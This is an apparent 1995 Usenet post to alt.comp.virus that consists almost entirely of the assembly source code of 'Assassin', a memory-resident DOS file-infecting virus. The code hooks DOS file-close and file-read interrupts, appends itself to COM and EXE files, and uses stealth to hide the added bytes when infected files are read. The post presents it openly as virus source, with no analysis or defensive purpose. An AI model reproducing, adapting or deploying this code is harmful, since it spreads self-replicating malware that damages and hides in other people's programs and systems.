From netcom.com!ix.netcom.com!howland.reston.ans.net!cs.utexas.edu!utnut!torn!uunet.ca!uunet.ca!io.org!grin.io.org!scottjp Sat Jan 14 12:10:08 1995
Xref: netcom.com alt.comp.virus:961
Path: netcom.com!ix.netcom.com!howland.reston.ans.net!cs.utexas.edu!utnut!torn!uunet.ca!uunet.ca!io.org!grin.io.org!scottjp
From: scottjp@grin.io.org (h0m3r s3xu4l)
Newsgroups: alt.comp.virus
Subject: Assassin source code
Date: 9 Jan 1995 21:10:06 GMT
Organization: Internex Online, Toronto, Ontario, Canada (416 363 3783)
Lines: 539
Message-ID: <3es8ne$c9i@ionews.io.org>
NNTP-Posting-Host: grin.io.org
X-Newsreader: TIN [version 1.2 PL2]


; Assassin (Bug Fix version)
;       by Dark Slayer

mem_size equ    offset memory_end-offset start
mem_para equ    (mem_size+0fh)/10h
low_mem_size equ mem_size+100h
low_mem_para equ (low_mem_size+0fh)/10h
vir_size equ    offset vir_end-offset start
vir_sector equ  (vir_size+1ffh+2)/200h
constant_size equ offset constant-offset start

        .model  tiny
        .code
        org     0
start:
        xor     di,di
        mov     dx,ds:[di+2]
        sub     dh,5

        mov     ah,26h
        int     21h

        mov     bp,ds:[di+2ch]

        mov     ah,4ah
        mov     bx,low_mem_para
        int     21h

        mov     ah,52h
        int     21h
        mov     bx,es:[bx-2]
        mov     ax,cs
        dec     ax
mcb:
        mov     cx,ds
        mov     ds,bx
        inc     bx
        mov     dx,bx
        add     bx,ds:[di+3]
        or      bp,bp
        jnz     not_boot
        cmp     ax,bx
        jne     not_our_mcb
        add     word ptr ds:[di+3],low_mem_para+1
not_our_mcb:
        cmp     ax,cx
        jne     not_boot
        mov     ds:[di+1],dx
        mov     di,8
        push    ds
        pop     es
        mov     si,di
        mov     ds,ax
        mov     cx,di
        rep     movsb
        push    dx
        add     ax,10h+1
        push    ax
        jmp     short search
not_boot:
        cmp     byte ptr ds:[di],4dh
        je      mcb
        cmp     byte ptr ds:[di],5ah
        je      mcb
        mov     sp,low_mem_size
        sub     dx,mem_para+1
        mov     es,dx
        sub     dx,cx
        dec     dx
        mov     ds,cx
        mov     ds:[di+3],dx
        mov     si,100h
        mov     cx,vir_size
        rep     movs byte ptr es:[di],cs:[si]

        push    es
search:
        mov     ax,352ah
        int     21h
        pop     ds
        push    ds
        mov     di,offset i21_table
        mov     ds:old2a[di]-i21_table,bx
        mov     ds:old2a[di+2]-i21_table,es
        mov     ah,25h
        mov     dx,offset int2a
        int     21h
        mov     dx,bx
        push    es
        pop     ds
        int     21h
        pop     es
        lds     si,es:[di]
search_table:
        lodsw
search_table_:
        dec     si
        cmp     ax,8b2eh
        jne     search_table
        lodsw
        cmp     ah,9fh
        jne     search_table_
        movsw
        scasw
        lea     ax,[si-1e0h]
        stosw
        xchg    si,ax
        mov     word ptr ds:[si],0eacbh
        mov     word ptr ds:[si+2],offset i21_3e
        mov     ds:[si+4],es
        mov     byte ptr ds:[si+6],0eah
        mov     word ptr ds:[si+7],offset i21_3f
        mov     ds:[si+9],es
        call    set21

        mov     cx,bp
        jcxz    boot
        mov     ds,bp
        xor     si,si
l2:
        lodsw
        dec     si
        or      ax,ax
        jnz     l2
        lea     dx,[si+3]
        mov     di,offset pcb+4+100h
        push    cs
        pop     es
        mov     ax,cs
        stosw
        scasw
        stosw
        scasw
        stosw
        mov     ax,4b00h
        mov     bx,offset pcb+100h
        int     21h
        mov     ah,4dh
        int     21h
        mov     ah,4ch
        int     21h

boot:
        pop     dx
        mov     ah,26h
        int     21h
        mov     bl,3
        mov     ss:[bp+18h+5],bl
        mov     ax,1216h
        int     2fh
        inc     bp
        mov     es:[di],bp
        mov     ss,dx
        mov     ds,dx
        mov     ax,4200h
        mov     bl,5
        cwd
        int     21h
        mov     ah,3fh
        dec     cx
        inc     dh
        int     21h
        mov     ah,3eh
        int     21h
        push    ds
        pop     es
        push    ds
        push    dx
        retf

read_cmp proc
        mov     cx,vir_size
        mov     dx,cx
        push    cs
        pop     ds
        call    read
        jc      rc_exit
        push    cx
        xor     si,si
if (vir_size and 0ff00h) eq (constant_size and 0ff00h)
        mov     cl,constant_size and 0ffh
else
        mov     cx,constant_size
endif
compare:
        lodsb
        cmp     al,ds:read_buffer[si-1]
        loope   compare
        clc
        pop     cx
rc_exit:
        ret
read_cmp endp

read    proc
        push    bx
        push    dx
        push    ds
        mov     ax,1229h
        int     2fh
        pop     ds
        pop     dx
        pop     bx
        ret
read    endp

write   proc
        mov     bp,40h*2
i21_func proc
        pop     ax
        push    bx
        push    cs
        push    ax
        push    cs
        pop     ds
        push    ds:i21_far_jmp
        les     di,dword ptr ds:i21_table
        push    es
        push    es:[di+bp]
        retf
i21_func endp
write   endp

set2324_restore21 proc
        push    ds
        mov     si,23h*4
        xor     ax,ax
        mov     ds,ax
        mov     di,offset old23
        push    cs
        pop     es
        mov     ax,offset int23
        mov     bp,2
sm_23_1:
        movsw
        mov     ds:[si-2],ax
        movsw
        mov     ds:[si-2],cs
if ((int23-start) and 0ff00h) eq ((int24-start) and 0ff00h)
        mov     al,(offset int24-offset start) and 0ffh
else
        mov     ax,offset int24
endif
        dec     bp
        jnz     sm_23_1
        mov     si,di
        push    cs
        pop     ds
        mov     bp,-4
rs_1:
        inc     bp
        inc     bp
        les     di,dword ptr ds:i21_table
        mov     di,es:[di+bp+2+3eh*2]
        movsb
        movsw
        jnz     rs_1
        pop     ds

        pop     bp
        pop     ax
        push    es
        push    ax

get_sft proc
        push    bx
        mov     ax,1220h
        int     2fh
        mov     bl,es:[di]
        mov     ax,1216h
        int     2fh
        pop     bx
        jmp     bp
get_sft endp
set2324_restore21 endp

set21_restore23 proc
        mov     si,offset old23
        push    cs
        pop     ds
        mov     di,23h*4
        xor     cx,cx
        mov     es,cx
        mov     cl,4
        rep     movsw
        push    cs
        pop     es

set21   proc    ; es = vir segment
        push    ax
        mov     bx,-4
        mov     di,offset i21_3e_data
        mov     cx,es:i21_far_jmp[di]-i21_3e_data
        inc     cx
sm_1:
        inc     bx
        lds     si,dword ptr es:i21_table
        mov     ax,ds:[si+bx+3+3eh*2]
        mov     si,ax
        movsb
        movsw
        xchg    si,ax
        sub     ax,cx
        neg     ax
        mov     byte ptr ds:[si],0e9h
        mov     ds:[si+1],ax
        add     cx,5
        inc     bx
        jnz     sm_1
        pop     ax
        ret
set21   endp
set21_restore23 endp

i21_3e:
        call    set2324_restore21
        jc      jc_exit
        push    es
        pop     ds
        cmp     word ptr ds:[di],1
        jne     jne_exit
        les     ax,dword ptr ds:[di+28h]
        mov     dx,es
        cmp     ax,'OC'
        jne     exe
        mov     al,'M'
        jmp     short com
exe:
        cmp     ax,'XE'
        jne     jne_exit
com:
        cmp     dl,al
jne_exit:
        jne     jne_exit_
        les     ax,dword ptr ds:[di+11h]
        cmp     ax,vir_size
jc_exit:
        jb      jc_exit_
        cmp     ax,0ffffh-(vir_size+2)
        ja      jne_exit_
        mov     dx,es
        or      dx,dx
jne_exit_:
        jnz     i21_3e_exit
        mov     ds:[di+15h],dx
        mov     ds:[di+17h],dx
        les     si,dword ptr ds:[di+7]
        les     si,dword ptr es:[si+2]
        add     ax,si
        dec     ax
        div     si
        mov     cx,es
        inc     cx
        div     cl
        or      ah,ah
        jz      i21_3e_exit
        sub     cl,ah
        cmp     cl,vir_sector
jc_exit_:
        jb      i21_3e_exit
        les     ax,ds:[di+4]
        push    ax
        push    es
        and     ax,1000000000011100b
        jnz     close_
        mov     byte ptr ds:[di+2],2
        mov     ds:[di+4],al

        call    read_cmp
        jbe     close

        mov     si,cx
cmp_device:
        dec     si
        lodsw
        inc     ax
        loopnz  cmp_device
        jcxz    not_device
        dec     ax
        cmp     ax,ds:[si]
        je      close
        jmp     short cmp_device
not_device:
        mov     ax,es:[di+11h]
        mov     es:[di+15h],ax

        mov     cx,vir_size+2
        mov     dx,offset id
        call    write
        pop     bx
        jc      close
        sub     es:[di+11h],ax
        dec     cx
        dec     cx
        cwd
        mov     es:[di+15h],dx
        call    write
        pop     bx
close:
        push    es
        pop     ds
close_:
        pop     ds:[di+6]
        pop     ds:[di+4]
        mov     bp,0dh*2
        call    i21_func
        pop     bx
i21_3e_exit:
        mov     ax,1227h
        int     2fh
        jmp     i21_3f_exit

i21_3f:
        call    set2324_restore21

        les     ax,dword ptr es:[di+15h]
        push    ax
        push    es
        call    read
        pop     bp
        pop     si
        cmc
        jnc     jnc_exit
        test    word ptr es:[di+4],1000000000011000b
        jnz     jnz_3f_exit
        or      bp,bp
jnz_3f_exit:
        jnz     i21_3f_exit
        sub     si,vir_size
jnc_exit:
        jae     i21_3f_exit
        xor     cx,cx
        xchg    cx,es:[di+15h]
        push    cx
        xor     cx,cx
        xchg    cx,es:[di+17h]
        push    cx
        push    ax
        push    si

        push    dx
        push    ds
        call    read_cmp
        pop     ds
        pop     dx
        jc      i21_3f_exit_1
        jne     i21_3f_exit_1

        push    dx
        push    ds

        push    es
        pop     ds
        mov     ax,ds:[di+11h]
        mov     ds:[di+15h],ax
        add     word ptr ds:[di+11h],vir_size+2

        mov     cl,2
        mov     dx,offset read_buffer
        push    cs
        pop     ds
        call    read
        pop     ds
        pop     dx
        jc      i21_3f_exit_2
        cmp     word ptr cs:read_buffer,'SD'
        je      i21_3f_l0
        mov     ax,1218h
        int     2fh
        or      byte ptr ds:[si+16h],1
        jmp     short i21_3f_exit_2
i21_3f_l0:
        pop     si
        neg     si
        mov     ax,es:[di+11h]
        sub     ax,si
        mov     es:[di+15h],ax
        pop     cx
        push    cx
        push    cx
        cmp     cx,si
        jb      i21_3f_l1
        mov     cx,si
i21_3f_l1:
        call    read
i21_3f_exit_2:
        sub     word ptr es:[di+11h],vir_size+2
i21_3f_exit_1:
        pop     ax
        pop     ax
        pop     es:[di+17h]
        pop     es:[di+15h]
i21_3f_exit:
        call    set21_restore23
        push    ax
        mov     ax,1218h
        int     2fh
        mov     ax,ds:[si+16h]
        shr     ax,1
        pop     ax
        mov     ds:[si],ax
        retf

int23:
        call    set21_restore23
        jmp     dword ptr cs:old23

int24:
        xor     ax,ax
        iret
int2a:
        pop     cs:i21_table
        pop     cs:i21_table[2]
        sub     sp,4
        jmp     dword ptr cs:old2a

msg     db      ' This is [Assassin] written by Dark Slayer '
        db      'in Keelung. Taiwan <R.O.C> '

constant:

pcb     dw      0,80h,?,5ch,?,6ch,?
id      db      'DS'
vir_end:

read_buffer db  vir_size dup(?)

old2a   dw      ?,?
old23   dw      ?,?
old24   dw      ?,?
i21_3e_data db  3 dup(?)
i21_3f_data db  3 dup(?)
i21_table dw    ?,?
i21_far_jmp dw  ?

memory_end:
        end     start


